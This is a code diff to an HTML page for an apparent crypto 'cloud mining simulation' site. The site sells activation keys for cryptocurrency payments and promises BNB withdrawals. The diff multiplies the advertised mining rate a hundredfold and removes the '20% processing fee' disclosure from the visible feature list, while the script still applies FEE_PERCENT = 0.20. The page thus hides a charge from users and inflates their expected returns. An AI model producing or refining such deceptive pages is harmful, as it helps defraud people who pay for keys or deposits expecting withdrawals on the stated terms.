@@ -422,10 +422,10 @@
           <span id="miningStatusText" style="font-weight:700; color:#FCD34D;">⚙️ STAND BY</span>
           <span class="hash-badge" id="hashrateValue">0 H/s</span>
         </div>
-        <div class="bnb-main" id="bnbBalanceMain">0.0000000</div>
+        <div class="bnb-main" id="bnbBalanceMain">0.0000</div>
         <div style="display: flex; justify-content: space-between; margin-top: 8px;">
           <span class="stats-text">💰 ≈ $<span id="usdBalanceSpan">0.00</span> USD</span>
-          <span class="stats-text">⚡ RATE: 0.000001 BNB/s</span>
+          <span class="stats-text">⚡ RATE: 0.0001 BNB/s</span>
         </div>
         <div class="price-note">1 BNB = $613.33 USD</div>
       </div>
@@ -495,7 +495,7 @@
           <li>🔹 • 24/7 cloud mining simulation</li>
           <li>🔹 • Multi-currency payments (BTC, ETH, USDT, BNB, DOGE, SOL, TON, etc)</li>
           <li>🔹 • Instant key delivery after payment proof</li>
-          <li>🔹 • Secure & transparent withdrawals (20% processing fee)</li>
+          <li>🔹 • Secure & transparent withdrawals</li>
         </ul>
         <div class="price-note" style="margin-top: 12px;">💰 Current BNB Price: $613.33 USD</div>
       </div>
@@ -535,7 +535,7 @@
 <script>
   // CONSTANTS - Updated with new price and 20% fee
   const BNB_PRICE = 613.33;
-  const RATE_PER_SEC = 0.000001;
+  const RATE_PER_SEC = 0.0001;
   const MIN_WITHDRAW_BNB = 0.9;
   const ACTIVATION_KEY = "JKALWOZHBD";
   const FEE_PERCENT = 0.20;  // 20% processing fee
